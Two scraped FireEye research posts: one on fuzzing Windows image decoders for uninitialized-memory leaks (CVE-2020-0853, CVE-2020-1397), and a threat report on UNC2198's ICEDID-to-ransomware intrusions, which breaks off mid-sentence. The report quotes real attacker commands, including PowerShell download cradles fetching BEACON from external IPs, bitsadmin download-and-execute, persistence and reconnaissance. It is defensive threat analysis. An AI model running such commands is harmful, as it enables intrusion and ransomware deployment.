                "text": "Continuing our discussion of image parsing vulnerabilities in Windows , we take a look at a comparatively less popular vulnerability class: uninitialized memory. In this post, we will look at Windows’ inbuilt image parsers—specifically for vulnerabilities involving the use of uninitialized memory. The Vulnerability: Uninitialized Memory In unmanaged languages, such as C or C++, variables are not initialized by default. Using uninitialized variables causes undefined behavior and may cause a crash. There are roughly two variants of uninitialized memory: Direct uninitialized memory usage: An uninitialized pointer or an index is used in read or write. This may cause a crash. Information leakage (info leak) through usage of uninitialized memory: Uninitialized memory content is accessible across a security boundary. An example: an uninitialized kernel buffer accessible from user mode, leading to information disclosure. In this post we will be looking closely at the second variant in Windows image parsers, which will lead to information disclosure in situations such as web browsers where an attacker can read the decoded image back using JavaScript. Detecting Uninitialized Memory Vulnerabilities Compared to memory corruption vulnerabilities such as heap overflow and use-after-free, uninitialized memory vulnerabilities on their own do not access memory out of bound or out of scope. This makes detection of these vulnerabilities slightly more complicated than memory corruption vulnerabilities. While direct uninitialized memory usage can cause a crash and can be detected, information leakage doesn’t usually cause any crashes. Detecting it requires compiler instrumentations such as MemorySanitizer or binary instrumentation/recompilation tools such as Valgrind. Detour: Detecting Uninitialized Memory in Linux Let's take a little detour and look at detecting uninitialized memory in Linux and compare with Windows’ built-in capabilities. Even though compilers warn about some uninitialized variables, most of the complicated cases of uninitialized memory usage are not detected at compile time. For this, we can use a run-time detection mechanism. MemorySanitizer is a compiler instrumentation for both GCC and Clang, which detects uninitialized memory reads. A sample of how it works is given in Figure 1. $ cat sample.cc #include <stdio.h> int main() { int *arr = new int[10]; if(arr[3] == 0) { printf(\"Yay!\\n\"); } printf(\"%08x\\n\", arr[3]); return 0; } $ clang++ -fsanitize=memory -fno-omit-frame-pointer -g sample.cc $ ./a.out ==29745==WARNING: MemorySanitizer: use-of-uninitialized-value #0 0x496db8  (/home/dan/uni/a.out+0x496db8) #1 0x7f463c5f1bf6  (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #2 0x41ad69  (/home/dan/uni/a.out+0x41ad69) SUMMARY: MemorySanitizer: use-of-uninitialized-value (/home/dan/uni/a.out+0x496db8) Exiting Figure 1: MemorySanitizer detection of uninitialized memory Similarly, Valgrind can also be used to detect uninitialized memory during run-time. Detecting Uninitialized Memory in Windows Compared to Linux, Windows lacks any built-in mechanism for detecting uninitialized memory usage. While Visual Studio and Clang-cl recently introduced AddressSanitizer support , MemorySanitizer and other sanitizers are not implemented as of this writing. Some of the useful tools in Windows to detect memory corruption vulnerabilities such as PageHeap do not help in detecting uninitialized memory. On the contrary, PageHeap fills the memory allocations with patterns, which essentially makes them initialized. There are few third-party tools, including Dr.Memory, that use binary instrumentation to detect memory safety issues such as heap overflows, uninitialized memory usages, use-after-frees, and others. Detecting Uninitialized Memory in Image Decoding Detecting uninitialized memory in Windows usually requires binary instrumentation, especially when we do not have access to source code. One of the indicators we can use to detect uninitialized memory usage, specifically in the case of image decoding, is the resulting pixels after the image is decoded. When an image is decoded, it results in a set of raw pixels. If image decoding uses any uninitialized memory, some or all of the pixels may end up as random. In simpler words, decoding an image multiple times may result in different output each time if uninitialized memory is used. This difference of output can be used to detect uninitialized memory and aid writing a fuzzing harness targeting Windows image decoders. An example fuzzing harness is presented in Figure 2. #define ROUNDS 20 unsigned char* DecodeImage(char *imagePath) { unsigned char *pixels = NULL; // use GDI or WIC to decode image and get the resulting pixels ... ... return pixels; } void Fuzz(char *imagePath) { unsigned char *refPixels = DecodeImage(imagePath); if(refPixels != NULL) { for(int i = 0; i < ROUNDS; i++) { unsigned char *currPixels = DecodeImage(imagePath); if(!ComparePixels(refPixels, currPixels)) { // the reference pixels and current pixels don't match // crash now to let the fuzzer know of this file CrashProgram(); } free(currPixels); } free(refPixels); } } Figure 2: Diff harness The idea behind this fuzzing harness is not entirely new; previously, lcamtuf used a similar idea to detect uninitialized memory in open-source image parsers and used a web page to display the pixel differences. Fuzzing With the diffing harness ready, one can proceed to look for the supported image formats and gather corpuses. Gathering image files for corpus is considerably easy given the near unlimited availability on the internet, but at the same time it is harder to find good corpuses among millions of files with unique code coverage. Code coverage information for Windows image parsing is tracked from WindowsCodecs.dll. Note that unlike regular Windows fuzzing, we will not be enabling PageHeap this time as PageHeap “initializes” the heap allocations with patterns. Results During my research, I found three cases of uninitialized memory usage while fuzzing Windows built-in image parsers. Two of them are explained in detail in the next sections. Root cause analysis of uninitialized memory usage is non-trivial. We don’t have a crash location to back trace, and have to use the resulting pixel buffer to back trace to find the root cause—or use clever tricks to find the deviation. CVE-2020-0853 Let’s look at the rendering of the proof of concept (PoC) file before going into the root cause of this vulnerability. For this we will use lcamtuf’s HTML, which loads the PoC image multiple times and compares the pixels with reference pixels. Figure 3: CVE-2020-0853 As we can see from the resulting images (Figure 3), the output varies drastically in each decoding and we can assume this PoC leaks a lot of uninitialized memory. To identify the root cause of these vulnerabilities, I used Time Travel Debugging (TTD) extensively. Tracing back the execution and keeping track of the memory address is a tedious task, but TTD makes it only slightly less painful by keeping the addresses and values constant and providing unlimited forward and backward executions. After spending quite a bit of time debugging the trace, I found the source of uninitialized memory in windowscodecs!CFormatConverter::Initialize . Even though the source was found, it was not initially clear why this memory ends up in the calculation of pixels without getting overwritten at all. To solve this mystery, additional debugging was done by comparing PoC execution trace against a normal TIFF file decoding. The following section shows the allocation, copying of uninitialized value to pixel calculation and the actual root cause of the vulnerability. Allocation and Use of Uninitialized Memory windowscodecs!CFormatConverter::Initialize allocates 0x40 bytes of memory, as shown in Figure 4. 0:000> r rax=0000000000000000 rbx=0000000000000040 rcx=0000000000000040 rdx=0000000000000008 rsi=000002257a3db448 rdi=0000000000000000 rip=00007ffaf047a238 rsp=000000ad23f6f7c0 rbp=000000ad23f6f841 r8=000000ad23f6f890  r9=0000000000000010 r10=000002257a3db468 r11=000000ad23f6f940 r12=000000000000000e r13=000002257a3db040 r14=000002257a3dbf60 r15=0000000000000000 iopl=0         nv up ei pl zr na po nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246 windowscodecs!CFormatConverter::Initialize+0x1c8: 00007ffa`f047a238 ff15ea081200    call    qword ptr [windowscodecs!_imp_malloc (00007ffa`f059ab28)] ds:00007ffa`f059ab28={msvcrt!malloc (00007ffa`f70e9d30)} 0:000> k # Child-SP          RetAddr               Call Site 00 000000ad`23f6f7c0 00007ffa`f047c5fb     windowscodecs!CFormatConverter::Initialize+0x1c8 01 000000ad`23f6f890 00007ffa`f047c2f3     windowscodecs!CFormatConverter::Initialize+0x12b 02 000000ad`23f6f980 00007ff6`34ca6dff     windowscodecs!CFormatConverterResolver::Initialize+0x273 // Uninitialized memory after allocation : 0:000> db @rax 00000225`7a3dbf70  d0 b0 3d 7a 25 02 00 00-60 24 3d 7a 25 02 00 00  ..=z%...`$=z%... 00000225`7a3dbf80  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbf90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbfa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbfb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbfc0  00 00 00 00 00 00 00 00-64 51 7c 26 c3 2c 01 03  ........dQ|&.,.. 00000225`7a3dbfd0  f0 00 2f 6b 25 02 00 00-f0 00 2f 6b 25 02 00 00  ../k%...../k%... 00000225`7a3dbfe0  60 00 3d 7a 25 02 00 00-60 00 3d 7a 25 02 00 00  `.=z%...`.=z%... Figure 4: Allocation of memory The memory never gets written and the uninitialized values are inverted in windowscodecs!CLibTiffDecoderBase::HrProcessCopy and further processed in windowscodecs!GammaConvert_16bppGrayInt_128bppRGBA and in later called scaling functions. As there is no read or write into uninitialized memory before HrProcessCopy, I traced the execution back from HrProcessCopy and compared the execution traces with a normal tiff decoding trace. A difference was found in the way windowscodecs!CLibTiffDecoderBase::UnpackLine behaved with the PoC file compared to a normal TIFF file, and one of the function parameters in UnpackLine was a pointer to the uninitialized buffer. The UnpackLine function has a series of switch-case statements working with bits per sample (BPS) of TIFF images. In our PoC TIFF file, the BPS value is 0x09—which is not supported by UnpackLine —and the control flow never reaches a code path that writes to the buffer. This is the root cause of the uninitialized memory, which gets processed further down the pipeline and finally shown as pixel data. Patch After presenting my analysis to Microsoft, they decided to patch the vulnerability by making the files with unsupported BPS values as invalid. This avoids all decoding and rejects the file in the very early phase of its loading. CVE-2020-1397 Figure 5: Rendering of CVE-2020-1397 Unlike the previous vulnerability, the difference in the output is quite limited in this one, as seen in Figure 5. One of the simpler root cause analysis techniques that can be used to figure out a specific type of uninitialized memory usage is comparing execution traces of runs that produce two different outputs. This specific technique can be helpful when an uninitialized variable causes a control flow change in the program and that causes a difference in the outputs. For this, a binary instrumentation script was written, which logged all the instructions executed along with its registers and accessed memory values. Diffing two distinct execution traces by comparing the instruction pointer (RIP) value, I found a control flow change in windowscodecs!CCCITT::Expand2DLine due to a usage of an uninitialized value. Back tracing the uninitialized value using TTD trace was exceptionally useful for finding the root cause. The following section shows the allocation, population and use of the uninitialized value, which leads to the control flow change and deviance in the pixel outputs. Allocation windowscodecs!TIFFReadBufferSetup allocates 0x400 bytes of memory, as shown in Figure 6. windowscodecs!TIFFReadBufferSetup: ... allocBuff = malloc(size); *(v3 + 16) |= 0x200u; *(v3 + 480) = allocBuff; 0:000> k # Child-SP          RetAddr           Call Site 00 000000aa`a654f128 00007ff9`4404d4f3 windowscodecs!TIFFReadBufferSetup 01 000000aa`a654f130 00007ff9`4404d3c9 windowscodecs!TIFFFillStrip+0xab 02 000000aa`a654f170 00007ff9`4404d2dc windowscodecs!TIFFReadEncodedStrip+0x91 03 000000aa`a654f1b0 00007ff9`440396dd windowscodecs!CLibTiffDecoderBase::ReadStrip+0x74 04 000000aa`a654f1e0 00007ff9`44115fca windowscodecs!CLibTiffDecoderBase::GetOneUnpackedLine+0x1ad 05 000000aa`a654f2b0 00007ff9`44077400 windowscodecs!CLibTiffDecoderBase::HrProcessCopy+0x4a 06 000000aa`a654f2f0 00007ff9`44048dbb windowscodecs!CLibTiffDecoderBase::HrReadScanline+0x20 07 000000aa`a654f320 00007ff9`44048b40 windowscodecs!CDecoderBase::CopyPixels+0x23b 08 000000aa`a654f3d0 00007ff9`44043c95 windowscodecs!CLibTiffDecoderBase::CopyPixels+0x80 09 000000aa`a654f4d0 00007ff9`4404563b windowscodecs!CDecoderFrame::CopyPixels+0xb5 After allocation: 0:000> !heap -p -a @rax address 0000029744382140 found in _HEAP @ 29735190000 HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state 0000029744382130 0041 0000  [00]   0000029744382140    00400 - (busy) unknown!noop // Uninitialized memory after allocation 0:000> db @rax 00000297`44382140  40 7c 5e 97 29 5d 5f ae-73 31 98 70 b8 4f da ac  @|^.)]_.s1.p.O.. 00000297`44382150  06 51 54 18 2e 2a 23 3a-4f ab 14 27 e9 c6 2c 83  .QT..*#:O..'..,. 00000297`44382160  3a 25 b2 f6 9d e7 3c 09-cc a5 8e 27 b0 73 41 a9  :%....<....'.sA. 00000297`44382170  fb 9b 02 b5 81 3e ea 45-4c 0f ab a7 72 e3 21 e7  .....>.EL...r.!. 00000297`44382180  c8 44 84 3b c3 b5 44 8a-c9 6e 4b 2e 40 31 38 e0  .D.;..D..nK.@18. 00000297`44382190  85 f0 bd 98 3b 0b ca b8-78 b1 9d d0 dd 4d 61 66  ....;...x....Maf 00000297`443821a0  16 7d 0a e2 40 fa f8 45-4f 79 ab 95 d8 54 f9 44  .}..@..EOy...T.D 00000297`443821b0  66 26 28 00 b7 96 52 88-15 f0 ed 34 94 5f 6f 94  f&(...R....4._o. Figure 6: Allocation of memory Partially Populating the Buffer 0x10 bytes are copied from the input file to this allocated buffer by TIFFReadRawStrip1. The rest of the buffer remains uninitialized with random values, as shown in Figure 7. if ( !TIFFReadBufferSetup(v2, a2, stripCount) ) { return 0i64; } if ( TIFFReadRawStrip1(v2, v3, sizeToReadFromFile, \"TIFFFillStrip\") != sizeToReadFromFile ) 0:000> r rax=0000000000000001 rbx=000002973519a7e0 rcx=000002973519a7e0 rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000010 rip=00007ff94404d58c rsp=000000aaa654f128 rbp=0000000000000000 r8=0000000000000010  r9=00007ff94416fc38 r10=0000000000000000 r11=000000aaa654ef60 r12=0000000000000001 r13=0000000000000000 r14=0000029744377de0 r15=0000000000000001 iopl=0         nv up ei pl nz na pe nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202 windowscodecs!TIFFReadRawStrip1: 00007ff9`4404d58c 488bc4          mov     rax,rsp 0:000> k # Child-SP          RetAddr           Call Site 00 000000aa`a654f128 00007ff9`4404d491 windowscodecs!TIFFReadRawStrip1 01 000000aa`a654f130 00007ff9`4404d3c9 windowscodecs!TIFFFillStrip+0x49 02 000000aa`a654f170 00007ff9`4404d2dc windowscodecs!TIFFReadEncodedStrip+0x91 03 000000aa`a654f1b0 00007ff9`440396dd windowscodecs!CLibTiffDecoderBase::ReadStrip+0x74 04 000000aa`a654f1e0 00007ff9`44115fca windowscodecs!CLibTiffDecoderBase::GetOneUnpackedLine+0x1ad 05 000000aa`a654f2b0 00007ff9`44077400 windowscodecs!CLibTiffDecoderBase::HrProcessCopy+0x4a 06 000000aa`a654f2f0 00007ff9`44048dbb windowscodecs!CLibTiffDecoderBase::HrReadScanline+0x20 07 000000aa`a654f320 00007ff9`44048b40 windowscodecs!CDecoderBase::CopyPixels+0x23b 08 000000aa`a654f3d0 00007ff9`44043c95 windowscodecs!CLibTiffDecoderBase::CopyPixels+0x80 09 000000aa`a654f4d0 00007ff9`4404563b windowscodecs!CDecoderFrame::CopyPixels+0xb5 0:000> db 00000297`44382140 00000297`44382140  5b cd 82 55 2a 94 e2 6f-d7 2d a5 93 58 23 00 6c  [..U*..o.-..X#.l             // 0x10 bytes from file 00000297`44382150  06 51 54 18 2e 2a 23 3a-4f ab 14 27 e9 c6 2c 83  .QT..*#:O..'..,.             // uninitialized memory 00000297`44382160  3a 25 b2 f6 9d e7 3c 09-cc a5 8e 27 b0 73 41 a9  :%....<....'.sA. 00000297`44382170  fb 9b 02 b5 81 3e ea 45-4c 0f ab a7 72 e3 21 e7  .....>.EL...r.!. 00000297`44382180  c8 44 84 3b c3 b5 44 8a-c9 6e 4b 2e 40 31 38 e0  .D.;..D..nK.@18. 00000297`44382190  85 f0 bd 98 3b 0b ca b8-78 b1 9d d0 dd 4d 61 66  ....;...x....Maf 00000297`443821a0  16 7d 0a e2 40 fa f8 45-4f 79 ab 95 d8 54 f9 44  .}..@..EOy...T.D 00000297`443821b0  66 26 28 00 b7 96 52 88-15 f0 ed 34 94 5f 6f 94  f&(...R....4._o. Figure 7: Partial population of memory Use of Uninitialized Memory 0:000> r rax=0000000000000006 rbx=0000000000000007 rcx=0000000000000200 rdx=0000000000011803 rsi=0000029744382150 rdi=0000000000000000 rip=00007ff94414e837 rsp=000000aaa654f050 rbp=0000000000000001 r8=0000029744382550  r9=0000000000000000 r10=0000000000000008 r11=0000000000000013 r12=00007ff94418b7b0 r13=0000000000000003 r14=0000000023006c00 r15=00007ff94418bbb0 iopl=0         nv up ei pl nz na po nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206 windowscodecs!CCCITT::Expand2DLine+0x253: 00007ff9`4414e837 0fb606          movzx   eax,byte ptr [rsi] ds:00000297`44382150=06             ; Uninitialized memory being accessed 0:000> db 00000297`44382140 00000297`44382140  5b cd 82 55 2a 94 e2 6f-d7 2d a5 93 58 23 00 6c  [..U*..o.-..X#.l             // 0x10 bytes from file 00000297`44382150  06 51 54 18 2e 2a 23 3a-4f ab 14 27 e9 c6 2c 83  .QT..*#:O..'..,.             // uninitialized memory 00000297`44382160  3a 25 b2 f6 9d e7 3c 09-cc a5 8e 27 b0 73 41 a9  :%....<....'.sA. 00000297`44382170  fb 9b 02 b5 81 3e ea 45-4c 0f ab a7 72 e3 21 e7  .....>.EL...r.!. 00000297`44382180  c8 44 84 3b c3 b5 44 8a-c9 6e 4b 2e 40 31 38 e0  .D.;..D..nK.@18. 00000297`44382190  85 f0 bd 98 3b 0b ca b8-78 b1 9d d0 dd 4d 61 66  ....;...x....Maf 00000297`443821a0  16 7d 0a e2 40 fa f8 45-4f 79 ab 95 d8 54 f9 44  .}..@..EOy...T.D 00000297`443821b0  66 26 28 00 b7 96 52 88-15 f0 ed 34 94 5f 6f 94  f&(...R....4._o. 0:000> k # Child-SP          RetAddr           Call Site 00 000000aa`a654f050 00007ff9`4414df80 windowscodecs!CCCITT::Expand2DLine+0x253 01 000000aa`a654f0d0 00007ff9`4412afcc windowscodecs!CCCITT::CCITT_Expand+0xac 02 000000aa`a654f120 00007ff9`4404d3f0 windowscodecs!CCITTDecode+0x7c 03 000000aa`a654f170 00007ff9`4404d2dc windowscodecs!TIFFReadEncodedStrip+0xb8 04 000000aa`a654f1b0 00007ff9`440396dd windowscodecs!CLibTiffDecoderBase::ReadStrip+0x74 05 000000aa`a654f1e0 00007ff9`44115fca windowscodecs!CLibTiffDecoderBase::GetOneUnpackedLine+0x1ad 06 000000aa`a654f2b0 00007ff9`44077400 windowscodecs!CLibTiffDecoderBase::HrProcessCopy+0x4a 07 000000aa`a654f2f0 00007ff9`44048dbb windowscodecs!CLibTiffDecoderBase::HrReadScanline+0x20 08 000000aa`a654f320 00007ff9`44048b40 windowscodecs!CDecoderBase::CopyPixels+0x23b 09 000000aa`a654f3d0 00007ff9`44043c95 windowscodecs!CLibTiffDecoderBase::CopyPixels+0x80 0a 000000aa`a654f4d0 00007ff9`4404563b windowscodecs!CDecoderFrame::CopyPixels+0xb5 Figure 8: Reading of uninitialized value Depending on the uninitialized value (Figure 8), different code paths are taken in Expand2DLine, which will change the output pixels, as shown in Figure 9. { { if ( v11 != 1 || a2 ) { unintValue = *++allocBuffer | (unintValue << 8);          // uninit mem read } else { unintValue <<= 8; ++allocBuffer; } --v11; v16 += 8; } v29 = unintValue >> (v16 - 8); dependentUninitValue = *(l + 2i64 * v29); v16 -= *(l + 2i64 * v29 + 1); if ( dependentUninitValue >= 0 )             // path 1 break; if ( dependentUninitValue < '\\xC0' ) return 0xFFFFFFFFi64;                     // path 2 } if ( dependentUninitValue <= 0x3F )              // path xx break; Figure 9: Use of uninitialized memory in if conditions Patch Microsoft decided to patch this vulnerability by using calloc instead of malloc , which initializes the allocated memory with zeros. Conclusion Part Two of this blog series presents multiple vulnerabilities in Windows’ built-in image parsers. In the next post, we will explore newer supported image formats in Windows such as RAW, HEIF and more. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-02-25",
                    "source": "www.fireeye.com"
                },
                "text": "Mandiant Advanced Practices (AP) closely tracks the shifting tactics, techniques, and procedures (TTPs) of financially motivated groups who severely disrupt organizations with ransomware. In May 2020, FireEye released a blog post detailing intrusion tradecraft associated with the deployment of MAZE . As of publishing this post, we track 11 distinct groups that have deployed MAZE ransomware. At the close of 2020, we noticed a shift in a subset of these groups that have started to deploy EGREGOR ransomware in favor of MAZE ransomware following access acquired from ICEDID infections. Since its discovery in 2017 as a banking trojan, ICEDID evolved into a pernicious point of entry for financially motivated actors to conduct intrusion operations. In earlier years, ICEDID was deployed to primarily target banking credentials. In 2020 we observed adversaries using ICEDID more explicitly as a tool to enable access to impacted networks, and in many cases this was leading to the use of common post-exploitation frameworks and ultimately the deployment of ransomware. This blog post shines a heat lamp on the latest tradecraft of UNC2198, who used ICEDID infections to deploy MAZE or EGREGOR ransomware. Building an Igloo: ICEDID Infections Separate phases of intrusions are attributed to different uncategorized (UNC) groups when discrete operations such as obtaining access are not part of a contiguous operation. Pure “access operations” establish remote access into a target environment for follow on operations actioned by a separate group. A backdoor deployed to establish an initial foothold for another group is an example of an access operation. Between July and December 2020, an ICEDID phishing infection chain consisted of a multi-stage process involving MOUSEISLAND and PHOTOLOADER (Figure 1). Figure 1: Example UNC2420 MOUSEISLAND to ICEDID Infection Chain MOUSEISLAND is a Microsoft Word macro downloader used as the first infection stage and is delivered inside a password-protected zip attached to a phishing email (Figure 2). Based on our intrusion data from responding to ICEDID related incidents, the secondary payload delivered by MOUSEISLAND has been PHOTOLOADER, which acts as an intermediary downloader to install ICEDID. Mandiant attributes the MOUSEISLAND distribution of PHOTOLOADER and other payloads to UNC2420 , a distribution threat cluster created by Mandiant’s Threat Pursuit team. UNC2420 activity shares overlaps with the publicly reported nomenclature of “ Shathak ” or “ TA551 ”. Figure 2: UNC2420 MOUSEISLAND Phishing Email Ice, Ice, BEACON...UNC2198 Although analysis is always ongoing, at the time of publishing this blog post, Mandiant tracks multiple distinct threat clusters (UNC groups) of various sizes that have used ICEDID as a foothold to enable intrusion operations. The most prominent of these threat clusters is UNC2198 , a group that has targeted organizations in North America across a breadth of industries. In at least five cases, UNC2198 acquired initial access from UNC2420 MOUSEISLAND to conduct intrusion operations. In 2020, Mandiant attributed nine separate intrusions to UNC2198. UNC2198’s objective is to monetize their intrusions by compromising victim networks with ransomware. In July 2020, Mandiant observed UNC2198 leverage network access provided by an ICEDID infection to encrypt an environment with MAZE ransomware. As the year progressed into October and November, we observed UNC2198 shift from deploying MAZE to using EGREGOR ransomware during another Incident Response engagement. Like MAZE, EGREGOR is operated using an affiliate model , where affiliates who deploy EGREGOR are provided with proceeds following successful encryption and extortion for payment. The UNC2198 cluster expanded over the course of more than six months. Mandiant’s December 2020 blog post on UNCs described the analytical tradecraft we use to merge and graduate clusters of activity. Merging UNCs is a substantial analytical practice in which indicators and tradecraft attributed to one group are scrutinized against another. Two former UNCs that shared similar modus operandi were eventually merged into UNC2198. The Snowball Effect of Attribution AP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC. UNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed. Throughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one resulting in the deployment of MAZE ransomware. In October 2020, a slew of activity at both Incident Response engagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident attributed to UNC2198. One of the new UNC groups created in October 2020 was given the designation UNC2374. UNC2374 began as its own distinct cluster where BEACON, WINDARC, and SYSTEMBC were observed during an incident at a Managed Defense customer. Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet. Two and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into UNC2198. Some of the data points used in merging UNC2374 into UNC2198 include: UNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP port 25055: C = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com UNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\\teamviewers\\msi.dll The same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374 SYSTEMBC tunneler payloads. UNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time window during intrusion operations. The other UNC group created in October 2020 was given the designation UNC2414. Three separate intrusions were attributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198. A subset of the data points used to merge UNC2414 into UNC2198 include: UNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port 25055: C = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com UNC2198 and UNC2414 installed BEACON as C:\\Windows\\int32.dll UNC2198 and UNC2414 installed the RCLONE utility as C:\\Perflogs\\rclone.exe UNC2198 and UNC2414 were proven to be financially motivated actors that had leveraged ICEDID as initial access: UNC2198 had deployed MAZE UNC2414 had deployed EGREGOR The merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR ransomware. The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by Mandiant Intelligence. Figure 3 depicts the timeline of related intrusions and merges into UNC2198. Figure 3: UNC2198 timeline UNC2198 Intrusion Flow: After Initial Access Expanding the UNC2198 cluster through multiple intrusions and merges with other UNC groups highlights the range of TTPs employed. We have pulled out some key data from all our UNC2198 intrusions to illustrate an amalgamation of capabilities used by the threat actor. Establish Foothold After obtaining access, UNC2198 has deployed additional malware using various techniques. For instance, UNC2198 used InnoSetup droppers to install a WINDARC backdoor on the target host. UNC2198 also used BITS Jobs and remote PowerShell downloads to download additional tools like SYSTEMBC for proxy and tunneler capabilities. Example commands for download and execution are: %COMSPEC% /C echo bitsadmin /transfer 257e http://<REDACTED>/<REDACTED>.exe %APPDATA%<REDACTED>.exe & %APPDATA%<REDACTED>.exe & del %APPDATA% <REDACTED>.exe ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\FmpaXUHFennWxPIM.txt > \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat & %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat %COMSPEC% /C echo powershell.exe -nop -w hidden -c (new-object System.Net.WebClient).Downloadfile(http://<REDACTED>/<REDACTED>.exe, <REDACTED>.exe) ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\AVaNbBXzKyxktAZI.txt > \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat & %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIRE offensive security tools during this phase as well. Offensive Security Tooling UNC2198 has used offensive security tools similarly seen across many threat actors. UNC2198 has used BEACON in roughly 90% of their intrusions. UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including shellcode loaders using PowerShell scripts, service executables, and DLLs. While the ways and means of using BEACON are not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs. Focusing in on specific BEACON executables tells a different story beyond the use of the tool itself. Aside from junk code and API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware packaging, including odd command-line arguments visible within strings and upon execution via child processes: cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\\SOFTWARE\\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t REG_DWORD /d 3045 & exit cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\\\SOFTWARE\\\\YkUJvbgwtylk /v KYIaIoYxqwO /t REG_DWORD /d 9633 & exit cmd.exe /c set XlOLqhCejHbSNW=8300 & reg add HKCU\\SOFTWARE\\WaMgGneKhtgTTy /v LbmWADsevLywrkP /t REG_DWORD /d 3809 & exit These example commands are non-functional, as they do not modify or alter payload execution. Another technique involves installing BEACON using a file path containing mixed Unicode-escaped and ASCII characters to evade detection: Unicode Escaped C:\\ProgramData\\S\\u0443sH\\u0435\\u0430ls\\T\\u0430s\\u0441host.exe Unicode Unescaped C:\\ProgramData\\SуsHеаls\\Tаsсhost.exe The executable was then executed by using a Scheduled Task named shadowdev : cmd.exe /c schtasks /create /sc minute /mo 1 /tn shadowdev /tr C:\\\\ProgramData\\\\S\\u0443sH\\u0435\\u0430ls\\\\T\\u0430s\\u0441host.exe While the previous examples are related to compiled executables, UNC2198 has also used simple PowerShell download cradles to execute Base64-encoded and compressed BEACON stagers in memory: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth')) powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"hxxp://185.106.122[.]167:80/a\")) powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))\" Discovery and Reconnaissance UNC2198 has exhibited common TTPs seen across many threat groups during discovery and reconnaissance activities. UNC2198 has used the BloodHound active directory mapping utility during intrusions from within the “ C:\\ProgramData ” and “ C:\\Temp ” directories. The following are collective examples of various commands executed by UNC2198 over time to enumerate a compromised environment: arp -a whoami /groups whoami.exe  /groups /fo csv whoami /all net user < Redacted > net groups \"Domain Admins\" /domain net group \"Enterprise admins\" /domain net group \"local admins\" /domain net localgroup \"administrators\" /domain nltest /domain_trusts nltest /dclist:< Redacted > Lateral Movement and Privilege Escalation UNC2198 has used Windows Remote Management and RDP to move laterally between systems. UNC2198 has also performed remote execution of BEACON service binaries on targeted systems to move laterally. UNC2198 launches SMB BEACON using PowerShell, executing command lines such as the following: C:\\WINDOWS\\system32\\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAB bAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AH MASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADIALw...< Truncated > During one intrusion, UNC2198 used the SOURBITS privilege escalation utility to execute files on a target system. SOURBITS is a packaged exploit utility for CVE-2020-0787 , which is a vulnerability that was disclosed in 2020 for Windows Background Intelligent Transfer Service (BITS) . SOURBITS consists of code derived from a GitHub Repository that is implemented as a command-line utility, which can execute arbitrary files with elevated privileges. UNC2198 used SOURBITS with the following components: C:\\Users\\<User>\\Downloads\\runsysO.cr C:\\Users\\<User>\\Downloads\\starterO.exe The file runsysO.cr is an XOR-encoded PE executable that exploits CVE-2020-0787, and based on the target system's bitness, it will drop one of two embedded SOURBITS payloads. Data Theft, Ransomware Deployment and #TTR Like other financially motivated threat actors, part of UNC2198’s modus operandi in latter stages of intrusions involves the exfiltration of hundreds of gigabytes of the victim organizations’ data before ransomware is installed. Specifically, 